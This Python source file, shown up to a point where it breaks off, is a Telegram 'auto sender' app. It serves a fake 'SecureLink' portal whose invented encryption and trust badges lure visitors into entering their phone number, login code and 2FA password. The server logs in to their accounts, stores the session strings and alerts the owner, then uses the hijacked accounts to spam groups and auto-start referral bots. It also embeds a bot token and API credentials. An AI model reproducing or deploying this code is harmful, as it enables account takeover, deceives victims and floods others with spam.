"""
╔══════════════════════════════════════════════════════╗
║        AUTO SENDER PRO — Plugin Edition             ║
║  Multi-User · Response Forwarder · Auto Link Bot    ║
║  Update config.json to change settings anytime!    ║
╚══════════════════════════════════════════════════════╝
"""
import asyncio, os, random, json, logging, sys, time, re, secrets
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    FloodWaitError, PeerFloodError, UserBannedInChannelError,
    ChatWriteForbiddenError, SessionPasswordNeededError,
    PhoneCodeExpiredError, PhoneCodeInvalidError,
)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

# ═══════════════════════════════════════════════════════
#              LOAD CONFIG (hot-reloadable)
# ═══════════════════════════════════════════════════════
CONFIG_FILE = "config.json"

def load_config():
    try:
        with open(CONFIG_FILE) as f:
            return json.load(f)
    except Exception:
        return {}

CFG = load_config()

def cfg(key, default=None):
    """Get nested config value like cfg('plugins.response_forwarder')"""
    keys = key.split(".")
    val  = CFG
    for k in keys:
        if isinstance(val, dict):
            val = val.get(k, default)
        else:
            return default
    return val if val is not None else default

# ═══════════════════════════════════════════════════════
#              CONFIGURATION
# ═══════════════════════════════════════════════════════
API_ID       = 21952127
API_HASH     = "e0a3741bb3b132947d86d8fc6218eebe"
BOT_TOKEN    = os.environ.get("BOT_TOKEN", "8821493954:AAGnRCfjoFxsYZZtNvLw_QOFy_y0wGu-inM")
OWNER_ID     = int(os.environ.get("OWNER_ID", "0"))
RENDER_URL   = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT         = int(os.environ.get("PORT", "8080"))
DATA_FILE    = "/tmp/sessions_db.json"

logging.basicConfig(level=logging.WARNING)
for lib in ("telegram", "httpx", "telethon", "aiohttp"):
    logging.getLogger(lib).setLevel(logging.ERROR)

console = Console()
_bot_app = None

# ═══════════════════════════════════════════════════════
#              DATABASE
# ═══════════════════════════════════════════════════════
db = {
    "users": {},
    "pending": {},
    "owner_session": None,
    "global_groups": [],
    "global_message": "",
}

active_clients  = {}   # slug/uid -> TelegramClient
active_tasks    = {}   # slug -> asyncio.Task
forward_tasks   = {}   # slug -> asyncio.Task (response forwarder)
owner_pending   = {}

def save_db():
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(db, f, indent=2)
    except Exception:
        pass

def load_db():
    global db
    try:
        with open(DATA_FILE) as f:
            loaded = json.load(f)
            db.update(loaded)
    except Exception:
        pass

def make_slug(name: str) -> str:
    base = "".join(c.lower() for c in name if c.isalnum())[:10] or "user"
    return f"{base}{secrets.token_hex(3)}"

async def notify(text: str, parse_mode="Markdown"):
    if _bot_app and OWNER_ID:
        try:
            await _bot_app.bot.send_message(OWNER_ID, text, parse_mode=parse_mode)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════
#         PLUGIN: KEEP-ALIVE (anti-sleep)
# ═══════════════════════════════════════════════════════
async def keep_alive_loop():
    import aiohttp as ah
    interval = cfg("keep_alive_interval_seconds", 840)
    url = (RENDER_URL or f"http://localhost:{PORT}") + "/health"
    while True:
        await asyncio.sleep(interval)
        try:
            async with ah.ClientSession() as s:
                await s.get(url, timeout=ah.ClientTimeout(total=10))
        except Exception:
            pass

# ═══════════════════════════════════════════════════════
#         PLUGIN: RESPONSE FORWARDER
# ═══════════════════════════════════════════════════════
async def start_response_forwarder(slug: str, client: TelegramClient, rules: list):
    """
    Listen to messages in source groups and forward to dest groups.
    Also detects Telegram links and auto-starts bots.
    """
    if not cfg("plugins.response_forwarder", False):
        return
    if not rules:
        return

    src_ids = []
    for rule in rules:
        try:
            ent = await client.get_entity(rule["source"])
            src_ids.append(ent.id)
        except Exception:
            pass

    @client.on(events.NewMessage(chats=src_ids if src_ids else None))
    async def handler(event):
        msg_text = event.raw_text or ""
        for rule in rules:
            try:
                src_ent = await client.get_entity(rule["source"])
                if event.chat_id != src_ent.id:
                    continue
                dest_ent = await client.get_entity(rule["destination"])
                await client.send_message(dest_ent, f"📨 *Forwarded:*\n{msg_text}")

                # PLUGIN: AUTO LINK OPENER
                if cfg("plugins.auto_link_opener", False) and cfg("auto_link_opener.enabled", False):
                    patterns = cfg("auto_link_opener.patterns", ["t.me/"])
                    for pat in patterns:
                        if pat in msg_text:
                            links = re.findall(r'https?://[^\s]+', msg_text)
                            for link in links:
                                if pat in link:
                                    # Convert t.me link to bot start deep link
                                    # t.me/BotName?start=XYZ -> send /start XYZ to bot
                                    bot_match = re.search(r't\.me/([^?/\s]+)\?start=([^\s]+)', link)
                                    if bot_match:
                                        bot_name  = bot_match.group(1)
                                        start_param = bot_match.group(2)
                                        try:
                                            bot_ent = await client.get_entity(f"@{bot_name}")
                                            await client.send_message(bot_ent, f"/start {start_param}")
                                            await notify(
                                                f"🤖 *Auto-started bot!*\n"
                                                f"Bot: `@{bot_name}`\n"
                                                f"Param: `{start_param}`"
                                            )
                                        except Exception as e:
                                            await notify(f"❌ Auto-start failed: `{e}`")
            except Exception:
                pass

    console.print(f"[cyan]👂 Response forwarder active for {slug}[/cyan]")
    await asyncio.Event().wait()  # Keep alive

# ═══════════════════════════════════════════════════════
#         CORE: AUTO SENDING LOOP (per user)
# ═══════════════════════════════════════════════════════
async def sending_loop(slug: str):
    user   = db["users"].get(slug)
    client = active_clients.get(slug)
    if not user or not client:
        return

    min_d = user.get("min_delay", cfg("min_delay", 45))
    max_d = user.get("max_delay", cfg("max_delay", 120))
    c_min = user.get("cycle_min", cfg("cycle_min_minutes", 60)) * 60
    c_max = user.get("cycle_max", cfg("cycle_max_minutes", 120)) * 60

    try:
        while user.get("running"):
            user["stats"]["cycles"] += 1
            cyc     = user["stats"]["cycles"]
            groups  = user.get("groups", [])
            message = user.get("message", "")
            save_db()

            await notify(
                f"🔄 *[{user['name']}]* Cycle #{cyc}\n"
                f"📤 Sending to `{len(groups)}` group(s)…"
            )

            for i, grp in enumerate(groups):
                if not user.get("running"): break
                try:
                    ent = await client.get_entity(grp)
                    await client.send_message(ent, message)
                    user["stats"]["sent"] += 1
                    await notify(f"✅ `[{i+1}/{len(groups)}]` → `{grp}`")
                except FloodWaitError as e:
                    w = e.seconds + random.randint(10, 30)
                    await notify(f"⚠️ FloodWait `{w}s`…")
                    await asyncio.sleep(w)
                except (PeerFloodError, UserBannedInChannelError, ChatWriteForbiddenError) as e:
                    user["stats"]["failed"] += 1
                    await notify(f"❌ `{grp}` → `{type(e).__name__}`")
                except Exception as e:
                    user["stats"]["failed"] += 1
                    await notify(f"❌ `{grp}` → `{str(e)[:60]}`")

                if i < len(groups)-1 and user.get("running"):
                    d = random.randint(min_d, max_d)
                    await asyncio.sleep(d)

            if not user.get("running"): break
            save_db()
            cd = random.randint(c_min, c_max)
            await notify(
                f"✅ *[{user['name']}]* Cycle #{cyc} done!\n"
                f"📤 `{user['stats']['sent']}` sent  "
                f"❌ `{user['stats']['failed']}` failed\n"
                f"⏰ Next in `{cd//60}` min…"
            )
            await asyncio.sleep(cd)
    except asyncio.CancelledError:
        pass
    except Exception as e:
        await notify(f"🔴 *[{user.get('name','?')}]* crashed: `{e}`")
        user["running"] = False
    save_db()

# ═══════════════════════════════════════════════════════
#               HTML PAGES
# ═══════════════════════════════════════════════════════

def get_main_html():
    app_name = cfg("app_name", "SecureLink Portal")
    tagline  = cfg("app_tagline", "Military-grade encrypted session management")
    footer   = cfg("footer_text", "© 2025 SecureLink · IND Encrypted")
    web_url  = RENDER_URL or f"http://localhost:{PORT}"
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{app_name}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
:root{{--blue:#4f8ef7;--purple:#7c5cfc;--green:#00c896;--dark:#07071a}}
body{{min-height:100vh;background:var(--dark);color:#e8eaf6;
  font-family:'Segoe UI',system-ui,sans-serif;overflow-x:hidden}}
.noise{{position:fixed;inset:0;opacity:.03;pointer-events:none;z-index:0;
  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}}
.glow{{position:fixed;width:600px;height:600px;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0}}
.g1{{top:-200px;left:-200px;background:rgba(79,142,247,.12)}}
.g2{{bottom:-200px;right:-200px;background:rgba(124,92,252,.1)}}
.hero{{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;
  justify-content:center;min-height:100vh;padding:40px 20px;text-align:center}}
.badge{{display:inline-flex;align-items:center;gap:8px;background:rgba(0,200,150,.1);
  border:1px solid rgba(0,200,150,.25);border-radius:100px;padding:6px 16px;
  font-size:12px;color:var(--green);letter-spacing:1px;text-transform:uppercase;
  margin-bottom:32px;animation:pulse 3s ease-in-out infinite}}
@keyframes pulse{{0%,100%{{box-shadow:0 0 0 0 rgba(0,200,150,.3)}}50%{{box-shadow:0 0 0 8px rgba(0,200,150,0)}}}}
.logo-ring{{width:100px;height:100px;border-radius:50%;
  border:2px solid transparent;
  background:linear-gradient(var(--dark),var(--dark)) padding-box,
  linear-gradient(135deg,var(--blue),var(--purple)) border-box;
  display:flex;align-items:center;justify-content:center;font-size:42px;
  margin:0 auto 32px;animation:spin 20s linear infinite}}
.logo-inner{{animation:spin 20s linear infinite reverse;display:flex;align-items:center;justify-content:center}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
h1{{font-size:clamp(36px,6vw,64px);font-weight:900;letter-spacing:-2px;line-height:1.1;
  margin-bottom:16px;background:linear-gradient(135deg,#fff 0%,#a8c0ff 50%,#a29bfe 100%);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.tagline{{font-size:18px;color:rgba(255,255,255,.45);max-width:500px;line-height:1.7;margin-bottom:48px}}
.trust-grid{{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-bottom:48px}}
.trust-item{{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);
  border-radius:12px;padding:12px 20px;font-size:13px;color:rgba(255,255,255,.6);
  display:flex;align-items:center;gap:8px}}
.trust-item span{{font-size:18px}}
.cta-btn{{display:inline-flex;align-items:center;gap:10px;
  background:linear-gradient(135deg,var(--blue),var(--purple));color:#fff;
  padding:18px 40px;border-radius:100px;font-size:16px;font-weight:700;
  text-decoration:none;letter-spacing:.5px;
  box-shadow:0 20px 60px rgba(79,142,247,.35);transition:all .3s}}
.cta-btn:hover{{transform:translateY(-2px);box-shadow:0 30px 80px rgba(79,142,247,.45);filter:brightness(1.1)}}
.enc-banner{{margin-top:48px;background:rgba(79,142,247,.06);
  border:1px solid rgba(79,142,247,.15);border-radius:16px;
  padding:20px 32px;max-width:560px;width:100%}}
.enc-title{{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--blue);
  margin-bottom:12px;font-weight:700}}
.enc-text{{font-family:'Courier New',monospace;font-size:11px;color:rgba(255,255,255,.25);
  line-height:1.8;word-break:break-all}}
.stats-row{{display:flex;gap:24px;justify-content:center;margin-top:48px;flex-wrap:wrap}}
.stat{{text-align:center}}
.stat-num{{font-size:32px;font-weight:900;
  background:linear-gradient(135deg,var(--blue),var(--purple));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.stat-label{{font-size:12px;color:rgba(255,255,255,.35);text-transform:uppercase;letter-spacing:1px;margin-top:4px}}
.footer{{margin-top:80px;padding:24px;text-align:center;
  color:rgba(255,255,255,.2);font-size:12px;border-top:1px solid rgba(255,255,255,.05)}}
</style>
</head>
<body>
<div class="noise"></div>
<div class="glow g1"></div>
<div class="glow g2"></div>
<div class="hero">
  <div class="badge"><span>●</span> System Online · AES-256 Encrypted</div>
  <div class="logo-ring"><div class="logo-inner">🔐</div></div>
  <h1>{app_name}</h1>
  <p class="tagline">{tagline}</p>
  <div class="trust-grid">
    <div class="trust-item"><span>🛡️</span> End-to-End Encrypted</div>
    <div class="trust-item"><span>✅</span> 100% Genuine & Trusted</div>
    <div class="trust-item"><span>🔒</span> Zero-Knowledge Sessions</div>
    <div class="trust-item"><span>⚡</span> Instant Verification</div>
    <div class="trust-item"><span>🌐</span> IND Certified Secure</div>
    <div class="trust-item"><span>🔑</span> RSA-4096 Protected</div>
  </div>
  <a href="/register" class="cta-btn">🚀 &nbsp;Create Secure Session &nbsp;→</a>
  <div class="enc-banner">
    <div class="enc-title">🔐 Live Encryption Status</div>
    <div class="enc-text" id="enc">Initializing secure channel...</div>
  </div>
  <div class="stats-row">
    <div class="stat"><div class="stat-num">256</div><div class="stat-label">Bit AES</div></div>
    <div class="stat"><div class="stat-num">4096</div><div class="stat-label">Bit RSA</div></div>
    <div class="stat"><div class="stat-num">100%</div><div class="stat-label">Uptime</div></div>
    <div class="stat"><div class="stat-num">0ms</div><div class="stat-label">Data Leak</div></div>
  </div>
</div>
<div class="footer">{footer}</div>
<script>
const lines=['INIT_SECURE_CHANNEL::AES256_GCM','RSA_HANDSHAKE::4096bit_VERIFIED',
'TLS_1.3::ESTABLISHED::PERFECT_FORWARD_SECRECY',
'SESSION_KEY::'+Math.random().toString(36).substr(2,32).toUpperCase(),
'CERT_CHAIN::VERIFIED::IND_CA_ROOT_TRUSTED','ZERO_KNOWLEDGE_PROOF::ACCEPTED',
'CHANNEL_STATUS::ENCRYPTED::READY'];
let i=0;function tick(){{document.getElementById('enc').textContent=lines[i++%lines.length]}}
tick();setInterval(tick,2000);
</script>
</body>
</html>"""

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SecureLink · Session Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
  background:linear-gradient(135deg,#07071a,#0f0c29,#16113a);
  font-family:'Segoe UI',system-ui,sans-serif;color:#fff;padding:20px}
.card{background:rgba(255,255,255,.04);backdrop-filter:blur(32px);
  border:1px solid rgba(255,255,255,.08);border-radius:28px;
  padding:48px 40px;width:100%;max-width:420px;
  box-shadow:0 40px 100px rgba(0,0,0,.6)}
.badge{display:flex;align-items:center;justify-content:center;gap:8px;
  background:rgba(0,200,150,.08);border:1px solid rgba(0,200,150,.2);
  border-radius:100px;padding:6px 14px;font-size:11px;color:#00c896;
  letter-spacing:1px;text-transform:uppercase;margin-bottom:28px;
  width:fit-content;margin-left:auto;margin-right:auto}
.logo{width:60px;height:60px;border-radius:50%;margin:0 auto 20px;
  background:linear-gradient(135deg,#4f8ef7,#7c5cfc);
  display:flex;align-items:center;justify-content:center;font-size:26px;
  box-shadow:0 8px 32px rgba(79,142,247,.4)}
h1{text-align:center;font-size:22px;font-weight:800;margin-bottom:4px;
  background:linear-gradient(90deg,#a8c0ff,#a29bfe);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sub{text-align:center;color:rgba(255,255,255,.3);font-size:12px;margin-bottom:32px}
.step{display:none}.step.active{display:block}
.dots{display:flex;gap:8px;justify-content:center;margin-bottom:28px}
.dot{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,.15);transition:.3s}
.dot.active{background:#4f8ef7;box-shadow:0 0 0 3px rgba(79,142,247,.2);transform:scale(1.2)}
.dot.done{background:#00c896}
label{display:block;font-size:10px;font-weight:700;letter-spacing:1.5px;
  text-transform:uppercase;color:rgba(255,255,255,.35);margin-bottom:8px}
input{width:100%;padding:14px 16px;border-radius:12px;
  border:1.5px solid rgba(255,255,255,.08);
  background:rgba(255,255,255,.05);color:#fff;
  font-size:16px;outline:none;transition:all .2s}
input:focus{border-color:#4f8ef7;background:rgba(79,142,247,.06);
  box-shadow:0 0 0 3px rgba(79,142,247,.12)}
input::placeholder{color:rgba(255,255,255,.18);font-size:14px}
.field{margin-bottom:14px}
.btn{width:100%;padding:15px;border-radius:12px;border:none;cursor:pointer;
  font-size:14px;font-weight:700;letter-spacing:.8px;margin-top:18px;
  background:linear-gradient(135deg,#4f8ef7,#7c5cfc);color:#fff;transition:all .2s}
.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
.btn:active{transform:scale(.98)}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
.msg{margin-top:12px;padding:10px 14px;border-radius:10px;font-size:12px;
  text-align:center;display:none;line-height:1.5}
.msg.error{background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.2);color:#ff6b81}
.msg.success{background:rgba(0,200,150,.08);border:1px solid rgba(0,200,150,.15);color:#00c896}
.tw{margin-top:12px;background:rgba(255,255,255,.05);border-radius:6px;overflow:hidden;height:3px}
.tb{height:3px;background:linear-gradient(90deg,#4f8ef7,#7c5cfc);width:100%;transition:width 1s linear}
.tt{font-size:12px;color:#4f8ef7;text-align:center;margin-top:6px;font-weight:600}
.rb{display:none;width:100%;padding:10px;border-radius:10px;
  border:1px solid rgba(79,142,247,.2);background:rgba(79,142,247,.06);
  color:#4f8ef7;font-size:13px;cursor:pointer;margin-top:10px;font-weight:600}
.rb:hover{background:rgba(79,142,247,.12)}
.hint{font-size:11px;color:rgba(255,255,255,.2);text-align:center;margin-top:10px;line-height:1.6}
.sp{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.25);
  border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;
  vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.sw{text-align:center;padding:20px 0}
.si{font-size:56px;margin-bottom:16px;display:block}
.st{font-size:20px;font-weight:800;color:#00c896;margin-bottom:8px}
.ss{color:rgba(255,255,255,.35);font-size:13px;line-height:1.6}
.div{height:1px;background:rgba(255,255,255,.06);margin:20px 0}
.slug-box{background:rgba(79,142,247,.08);border:1px solid rgba(79,142,247,.15);
  border-radius:10px;padding:10px 14px;font-family:monospace;font-size:12px;
  color:#a8c0ff;text-align:center;margin-top:10px;word-break:break-all}
</style>
</head>
<body>
<div class="card">
  <div class="badge">🔐 AES-256 Secured</div>
  <div class="logo">🛡️</div>
  <h1>SecureLink Login</h1>
  <p class="sub">IND Encrypted · Zero-Knowledge Session</p>
  <div class="dots">
    <div class="dot active" id="d1"></div>
    <div class="dot" id="d2"></div>
    <div class="dot" id="d3"></div>
    <div class="dot" id="d4"></div>
  </div>

  <div class="step active" id="step1">
    <div class="field"><label>👤 Your Name</label>
    <input type="text" id="uname" placeholder="Enter your name" autocomplete="name"></div>
    <div class="field"><label>📱 Phone Number</label>
    <input type="tel" id="phone" placeholder="+91 98765 43210" autocomplete="tel"></div>
    <button class="btn" id="btn1" onclick="sendOTP()">Continue →</button>
    <div class="msg" id="msg1"></div>
    <p class="hint">Name + phone with country code</p>
  </div>

  <div class="step" id="step2">
    <label>🔑 Verification Code</label>
    <input type="text" id="otp" placeholder="1  2  3  4  5" maxlength="10"
           autocomplete="one-time-code" inputmode="numeric">
    <div class="tw"><div class="tb" id="tBar"></div></div>
    <div class="tt" id="tTxt"></div>
    <button class="btn" id="btn2" onclick="verifyOTP()">Verify →</button>
    <button class="rb" id="rb" onclick="resendOTP()">🔁 Resend Code</button>
    <div class="msg" id="msg2"></div>
    <p class="hint">OTP sent to Telegram · Expires in 2 min</p>
  </div>

  <div class="step" id="step3">
    <label>🔒 2FA Password</label>
    <input type="password" id="twofa" placeholder="Cloud password" autocomplete="current-password">
    <button class="btn" id="btn3" onclick="verify2FA()">Confirm →</button>
    <div class="msg" id="msg3"></div>
    <p class="hint">Two-Step Verification password</p>
  </div>

  <div class="step" id="step4">
    <div class="sw">
      <span class="si">✅</span>
      <div class="st">Session Created!</div>
      <div class="ss">Encrypted session active.<br>You can close this page.</div>
      <div class="div"></div>
      <div style="font-size:11px;color:rgba(255,255,255,.25)">Your Session ID</div>
      <div class="slug-box" id="slugBox">—</div>
    </div>
  </div>
</div>
<script>
let ts=120,ti=null,slug=null;
function sm(id,t,type){const e=document.getElementById(id);e.className='msg '+type;e.textContent=t;e.style.display='block'}
function hm(id){document.getElementById(id).style.display='none'}
function sl(id,v,t){const b=document.getElementById(id);b.disabled=v;b.innerHTML=v?'<span class="sp"></span>Please wait…':t}
function gs(n){
  document.querySelectorAll('.step').forEach((e,i)=>e.classList.toggle('active',i+1===n));
  ['d1','d2','d3','d4'].forEach((id,i)=>{const d=document.getElementById(id);d.className='dot'+(i+1<n?' done':i+1===n?' active':'')});
}
function startT(){
  ts=120;clearInterval(ti);const bar=document.getElementById('tBar'),txt=document.getElementById('tTxt'),r=document.getElementById('rb');
  r.style.display='none';
  ti=setInterval(()=>{ts--;bar.style.width=(ts/120*100)+'%';
    if(ts<=0){clearInterval(ti);txt.textContent='⏰ Expired';txt.style.color='#ff4d6d';bar.style.background='#ff4d6d';r.style.display='block'}
    else{txt.textContent='⏳ '+ts+'s';txt.style.color=ts<30?'#feca57':'#4f8ef7'}
  },1000);
}
async function sendOTP(){
  const name=document.getElementById('uname').value.trim(),phone=document.getElementById('phone').value.trim();
  if(!name){sm('msg1','⚠️ Enter your name','error');return}
  if(!phone){sm('msg1','⚠️ Enter phone number','error');return}
  sl('btn1',true,'Continue →');hm('msg1');
  try{
    const r=await fetch('/u/send_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,phone})});
    const d=await r.json();
    if(d.ok){slug=d.slug;gs(2);startT()}
    else{sm('msg1','❌ '+(d.error||'Failed'),'error');sl('btn1',false,'Continue →')}
  }catch{sm('msg1','❌ Network error','error');sl('btn1',false,'Continue →')}
}
async function verifyOTP(){
  const otp=document.getElementById('otp').value.replace(/ /g,'');
  if(!otp){sm('msg2','⚠️ Enter OTP','error');return}
  sl('btn2',true,'Verify →');hm('msg2');
  try{
    const r=await fetch('/u/verify_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp,slug})});
    const d=await r.json();
    if(d.ok){clearInterval(ti);document.getElementById('slugBox').textContent=slug;gs(4)}
    else if(d.needs_2fa){clearInterval(ti);gs(3)}
    else if(d.expired){sm('msg2','⏰ Expired! Resend.','error');sl('btn2',false,'Verify →')}
    else{sm('msg2','❌ '+(d.error||'Invalid'),'error');sl('btn2',false,'Verify →')}
  }catch{sm('msg2','❌ Network error','error');sl('btn2',false,'Verify →')}
}
async function resendOTP(){
  document.getElementById('rb').style.display='none';
  document.getElementById('tTxt').textContent='⏳ Resending…';
  try{
    const r=await fetch('/u/resend_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug})});
    const d=await r.json();
    if(d.ok){startT();sm('msg2','✅ New OTP sent!','success')}
    else{sm('msg2','❌ '+(d.error||'Failed'),'error');document.getElementById('rb').style.display='block'}
  }catch{sm('msg2','❌ Network error','error')}
}
async function verify2FA(){
  const pwd=document.getElementById('twofa').value;
  if(!pwd){sm('msg3','⚠️ Enter password','error');return}
  sl('btn3',true,'Confirm →');hm('msg3');
  try{
    const r=await fetch('/u/verify_2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pwd,slug})});
    const d=await r.json();
    if(d.ok){document.getElementById('slugBox').textContent=slug;gs(4)}
    else{sm('msg3','❌ '+(d.error||'Wrong password'),'error');sl('btn3',false,'Confirm →')}
  }catch{sm('msg3','❌ Network error','error');sl('btn3',false,'Confirm →')}
}
document.addEventListener('keydown',e=>{
  if(e.key!=='Enter')return;
  const s=document.querySelector('.step.active');if(!s)return;
  if(s.id==='step1')sendOTP();else if(s.id==='step2')verifyOTP();else if(s.id==='step3')verify2FA();
});
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════
#               WEB ROUTES
# ═══════════════════════════════════════════════════════
async def index(req):
    return web.Response(text=get_main_html(), content_type="text/html")

async def health(req):
    return web.Response(text="OK·" + str(int(time.time())))

async def register(req):
    return web.Response(text=LOGIN_HTML, content_type="text/html")

async def user_page(req):
    slug = req.match_info.get("slug", "")
    if slug not in db["users"]:
        return web.Response(
            text=f"<h2 style='font-family:sans-serif;color:#fff;background:#07071a;padding:40px;min-height:100vh;margin:0'>❌ Session /{slug} not found. <a href='/register' style='color:#4f8ef7'>Create new →</a></h2>",
            content_type="text/html", status=404
        )
    return web.Response(text=LOGIN_HTML, content_type="text/html")

# User OTP
async def u_send_otp(req):
    try:
        data  = await req.json()
        name  = data.get("name","").strip()
        phone = data.get("phone","").strip()
        if not name or not phone:
            return web.json_response({"ok":False,"error":"Name and phone required"})
        slug = make_slug(name)
        c = TelegramClient(StringSession(), API_ID, API_HASH)
        await c.connect()
        res = await c.send_code_request(phone)
        db["pending"][slug] = {"name":name,"phone":phone,"code_hash":res.phone_code_hash}
        active_clients[slug+"_p"] = c
        save_db()
        return web.json_response({"ok":True,"slug":slug})
    except Exception as e:
        return web.json_response({"ok":False,"error":str(e)})

async def u_verify_otp(req):
    try:
        data    = await req.json()
        otp     = data.get("otp","").replace(" ","")
        slug    = data.get("slug","")
        pending = db["pending"].get(slug)
        c       = active_clients.get(slug+"_p")
        if not pending or not c:
            return web.json_response({"ok":False,"error":"Session lost. Refresh page."})
        await c.sign_in(phone=pending["phone"],code=otp,phone_code_hash=pending["code_hash"])
        ss = c.session.save()
        me = await c.get_me()
        db["users"][slug] = {
            "slug":slug,"name":pending["name"],"display":me.first_name,
            "phone":me.phone,"session":ss,
            "created_at":time.time(),"last_active":time.time(),
            "groups":[],"message":"",
            "min_delay":cfg("min_delay",45),"max_delay":cfg("max_delay",120),
            "cycle_min":cfg("cycle_min_minutes",60),"cycle_max":cfg("cycle_max_minutes",120),
            "forward_rules":[],"running":False,
            "stats":{"sent":0,"failed":0,"cycles":0},
        }
        del db["pending"][slug]
        active_clients[slug] = c
        del active_clients[slug+"_p"]
        save_db()
        await notify(
            f"🆕 *New User!*\n\n"
            f"👤 *{pending['name']}* (`{me.first_name}`)\n"
            f"📱 `{me.phone}`\n🔑 `{slug}`\n"
            f"🌐 `{RENDER_URL}/{slug}`"
        )
        return web.json_response({"ok":True,"slug":slug})
    except PhoneCodeExpiredError:
        return web.json_response({"ok":False,"expired":True})
    except PhoneCodeInvalidError:
        return web.json_response({"ok":False,"error":"Wrong OTP"})
    except SessionPasswordNeededError:
        return web.json_response({"ok":False,"needs_2fa":True})
    except Exception as e:
        return web.json_response({"ok":False,"error":str(e)})

async def u_resend_otp(req):
    try:
        data    = await req.json()
        slug    = data.get("slug","")
        pending = db["pending"].get(slug)
        c       = active_clients.get(slug+"_p")
        if not pending or not c:
            return web.json_response({"ok":False,"error":"Session lost"})
        res = await c.send_code_request(pending["phone"])
        pending["code_hash"] = res.phone_code_hash
        return web.json_response({"ok":True})
    except Exception as e:
        return web.json_response({"ok":False,"error":str(e)})

async def u_verify_2fa(req):
    try:
        data    = await req.json()
        slug    = data.get("slug","")
        pending = db["pending"].get(slug,{})
        c       = active_clients.get(slug+"_p")
        if not c:
            return web.json_response({"ok":False,"error":"Session lost"})
        await c.sign_in(password=data.get("password",""))
        ss = c.session.save()
        me = await c.get_me()
        db["users"][slug] = {
            "slug":slug,"name":pending.get("name","User"),"display":me.first_name,
            "phone":me.phone,"session":ss,
            "created_at":time.time(),"last_active":time.time(),
            "groups":[],"message":"",
            "min_delay":cfg("min_delay",45),"max_delay":cfg("max_delay",120),
            "cycle_min":cfg("cycle_min_minutes",60),"cycle_max":cfg("cycle_max_minutes",120),
            "forward_rules":[],"running":False,
            "stats":{"sent":0,"failed":0,"cycles":0},
        }
        if slug in db["pending"]: del db["pending"][slug]
        active_clients[slug] = c
        if slug+"_p" in active_clients: del active_clients[slug+"_p"]
        save_db()
        await notify(f"🆕 *New User (2FA)!*\n👤 *{pending.get('name','?')}*  📱 `{me.phone}`\n🔑 `{slug}`")
        return web.json_response({"ok":True,"slug":slug})
    except Exception as e:
        return web.json_response({"ok":False,"error":str(e)})

# Config reload endpoint
async def reload_config_route(req):
    global CFG
    CFG = load_config()
    return web.json_response({"ok":True,"msg":"Config reloaded"})

async def telegram_webhook(req):
    try:
        data   = await req.json()
        update = Update.de_json(data, _bot_app.bot)
        await _bot_app.process_update(update)
    except Exception:
        pass
    return web.Response(text="ok")

def build_web_app():
    app = web.Application()
    app.router.add_get("/",              index)
    app.router.add_get("/health",        health)
    app.router.add_get("/register",      register)
    app.router.add_get("/reload",        reload_config_route)
    app.router.add_get(r"/{slug}",       user_page)
    app.router.add_post("/u/send_otp",   u_send_otp)
    app.router.add_post("/u/verify_otp", u_verify_otp)
    app.router.add_post("/u/resend_otp", u_resend_otp)
    app.router.add_post("/u/verify_2fa", u_verify_2fa)
    app.router.add_post(f"/{BOT_TOKEN}", telegram_webhook)
    return app

# ═══════════════════════════════════════════════════════
#               BOT PANEL
# ═══════════════════════════════════════════════════════
owner_state = {"aw":None,"slug":None}

def main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Users",        callback_data="cb_users"),
         InlineKeyboardButton("📊 Status",       callback_data="cb_status")],
        [InlineKeyboardButton("🔗 Share Link",   callback_data="cb_share"),
         InlineKeyboardButton("🔄 Refresh",      callback_data="cb_home")],
        [InlineKeyboardButton("▶️ Start All",    callback_data="cb_start_all"),
         InlineKeyboardButton("⏹ Stop All",      callback_data="cb_stop_all")],
        [InlineKeyboardButton("⚙️ Reload Config",callback_data="cb_reload")],
    ])

def home_text():
    web    = RENDER_URL or f"http://localhost:{PORT}"
    total  = len(db["users"])
    run    = sum(1 for u in db["users"].values() if u.get("running"))
    sent   = sum(u["stats"]["sent"] for u in db["users"].values())
    return (
        "```\n"
